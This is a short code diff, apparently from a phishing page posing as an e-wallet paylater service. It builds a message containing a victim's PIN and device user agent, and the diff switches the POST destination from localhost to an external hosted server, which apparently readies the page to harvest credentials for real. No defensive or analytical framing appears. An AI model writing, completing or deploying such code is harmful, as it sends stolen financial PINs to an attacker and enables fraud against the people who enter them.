@@ -52,7 +52,7 @@ PIN: ${pin}
 📱 Device: ${navigator.userAgent}
 `;
 
-  fetch("http://localhost:3000/send", {
+  fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
